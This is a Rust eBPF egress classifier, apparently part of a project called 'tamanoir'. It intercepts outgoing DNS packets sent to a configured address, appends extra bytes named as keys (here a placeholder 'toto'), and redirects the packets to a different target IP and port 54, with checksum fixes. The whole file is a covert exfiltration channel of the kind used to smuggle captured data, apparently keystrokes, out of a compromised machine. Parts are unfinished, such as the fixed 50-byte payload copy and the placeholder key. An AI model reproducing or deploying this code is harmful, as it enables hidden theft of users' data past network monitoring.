use core::net::Ipv4Addr;

use aya_ebpf::{
    bindings::TC_ACT_PIPE,
    cty::c_void,
    helpers::{bpf_csum_diff, bpf_csum_update, bpf_skb_store_bytes},
    macros::classifier,
    programs::TcContext,
};
use aya_log_ebpf::{error, info};
// use flex_dns::DnsMessage;
use network_types::{
    eth::{EthHdr, EtherType},
    ip::{IpProto, Ipv4Hdr},
    udp::UdpHdr,
};

use crate::common::{
    BPF_ADJ_ROOM_NET, HIJACK_IP, IP_CSUM_OFFSET, IP_DEST_ADDR_OFFSET, TARGET_IP, UDP_CSUM_OFFSET,
    UDP_DEST_PORT_OFFSET, UDP_OFFSET,
};

// Maps

#[classifier]
pub fn tamanoir_egress(ctx: TcContext) -> i32 {
    match tc_process_egress(ctx) {
        Ok(ret) => ret,
        Err(_) => TC_ACT_PIPE,
    }
}

fn tc_process_egress(ctx: TcContext) -> Result<i32, ()> {
    let target_ip: u32 = unsafe { core::ptr::read_volatile(&TARGET_IP) };
    let hijack_ip: u32 = unsafe { core::ptr::read_volatile(&HIJACK_IP) };
    let ethhdr: EthHdr = ctx.load(0).map_err(|_| ())?;
    if let EtherType::Ipv4 = ethhdr.ether_type {
        let mut header = ctx.load::<Ipv4Hdr>(EthHdr::LEN).map_err(|_| ())?;
        let addr = header.dst_addr;
        if let IpProto::Udp = header.proto {
            if addr == hijack_ip {
                let target_dns_mut = &mut target_ip.to_be() as *mut u32;
                let dns_payload_len =
                    u16::from_be(ctx.load::<UdpHdr>(UDP_OFFSET).map_err(|_| ())?.len) - 8;

                info!(&ctx, "payload sz {}  ", dns_payload_len);

                let dns_payload = ctx.load::<[u8; 50]>(UDP_OFFSET + 8).map_err(|_| ())?;
                let mut udp_hdr: UdpHdr = ctx.load::<UdpHdr>(UDP_OFFSET).map_err(|_| ())?;

                //let le_dns_payload = dns_payload.map(|b| u8::from_be(b));
                // for b in le_dns_payload {
                //     info!(&ctx, "{}", b);
                // }

                let skb = &ctx.skb;

                let added_keys = "toto".as_bytes();
                let fixed_size_added_keys: [u8; 4] = added_keys[..4].try_into().map_err(|_| ())?;

                let keys_as_u32: u32 = ((fixed_size_added_keys[0] as u32) << 24)
                    | ((fixed_size_added_keys[1] as u32) << 16)
                    | ((fixed_size_added_keys[2] as u32) << 8)
                    | fixed_size_added_keys[3] as u32;

                let offset = fixed_size_added_keys.len();
                let old_len_l4 = u16::from_be(udp_hdr.len);
                let old_len_l3_plus_l4 = u16::from_be(header.tot_len);

                udp_hdr.len = (old_len_l4 + offset as u16).to_be();
                header.tot_len = (old_len_l3_plus_l4 + offset as u16).to_be();
                info!(
                    &ctx,
                    "l4 len {} => {}",
                    old_len_l4,
                    u16::from_be(udp_hdr.len)
                );
                info!(
                    &ctx,
                    "total len {} => {}",
                    old_len_l3_plus_l4,
                    u16::from_be(header.tot_len)
                );

                // make room
                if let Err(err) = skb.adjust_room(offset as i32, BPF_ADJ_ROOM_NET, 0) {
                    error!(&ctx, "error adjusting room: {}", err);
                }

                //move udp header
                if unsafe {
                    bpf_skb_store_bytes(
                        skb.skb,
                        UDP_OFFSET as u32,
                        &udp_hdr as *const UdpHdr as *const c_void,
                        8,
                        2,
                    )
                } < 0
                {
                    error!(&ctx, "error shifting udp header ");
                }

                if unsafe {
                    bpf_skb_store_bytes(
                        skb.skb,
                        UDP_OFFSET as u32 + 8,
                        &dns_payload as *const [u8; 50] as *const c_void,
                        50,
                        2,
                    )
                } < 0
                {
                    error!(&ctx, "error shifting dns payload ");
                }

                if unsafe {
                    bpf_skb_store_bytes(
                        skb.skb,
                        UDP_OFFSET as u32 + 8 + 50,
                        &fixed_size_added_keys as *const [u8; 4] as *const c_void,
                        4,
                        2,
                    )
                } < 0
                {
                    error!(&ctx, "error shifting dns payload ");
                }
                // update dst addr
                if unsafe {
                    bpf_skb_store_bytes(
                        skb.skb,
                        IP_DEST_ADDR_OFFSET as u32,
                        target_dns_mut as *const c_void,
                        4,
                        2,
                    )
                } < 0
                {
                    error!(&ctx, "error writing new address ");
                }
                let target_por_mut = &mut 54u16.to_be() as *mut u16;
                if unsafe {
                    bpf_skb_store_bytes(
                        skb.skb,
                        UDP_DEST_PORT_OFFSET as u32,
                        target_por_mut as *const c_void,
                        2,
                        2,
                    )
                } < 0
                {
                    error!(&ctx, "error writing new address ");
                }
                info!(
                    &ctx,
                    "ipcsum: {}  udpcsum: {}",
                    u16::from_be(ctx.load::<u16>(IP_CSUM_OFFSET).unwrap()),
                    u16::from_be(ctx.load::<u16>(UDP_CSUM_OFFSET).unwrap())
                );

                //l3 checksums aready updated
                // if let Err(err) = (*skb).l3_csum_replace(
                //     IP_CSUM_OFFSET,
                //     header.dst_addr as u64,
                //     target_ip.to_be() as u64,
                //     4,
                // ) {
                //     error!(&ctx, "error: {}", err);
                // }

                // recompute l4 checksums
                // dst addr part for udphdr
                if let Err(err) = (*skb).l4_csum_replace(
                    UDP_CSUM_OFFSET,
                    header.dst_addr as u64,
                    target_ip.to_be() as u64,
                    20,
                ) {
                    error!(&ctx, "error: {}", err);
                }
                // dst addr part for udphdr
                if let Err(err) = (*skb).l4_csum_replace(
                    UDP_CSUM_OFFSET,
                    53u16.to_be() as u64,
                    54u16.to_be() as u64,
                    20,
                ) {
                    error!(&ctx, "error: {}", err);
                }
                //let l4_csum = ctx.load::<u16>(IP_CSUM_OFFSET).unwrap();
                // let csum_diff = unsafe {
                //     bpf_csum_diff(
                //         0,
                //         0,
                //         &mut keys_as_u32.to_be() as *mut u32,
                //         4,
                //         l4_csum as u32,
                //     )
                // };
                if let Err(err) =
                    (*skb).l4_csum_replace(UDP_CSUM_OFFSET, 0, keys_as_u32.to_be() as u64, 20)
                {
                    error!(&ctx, "error: {}", err);
                }

                info!(
                    &ctx,
                    "=> ipcsum: {}  udpcsum: {}",
                    u16::from_be(ctx.load::<u16>(IP_CSUM_OFFSET).unwrap()),
                    u16::from_be(ctx.load::<u16>(UDP_CSUM_OFFSET).unwrap())
                );

                info!(
                    &ctx,
                    "{}:{} -> {}:{}",
                    Ipv4Addr::from_bits(addr),
                    53,
                    Ipv4Addr::from_bits(u32::from_be(
                        (ctx.load::<Ipv4Hdr>(EthHdr::LEN).unwrap()).dst_addr,
                    )),
                    u16::from_be(ctx.load::<u16>(UDP_DEST_PORT_OFFSET).unwrap())
                );
            };
        }
    };

    Ok(TC_ACT_PIPE)
}
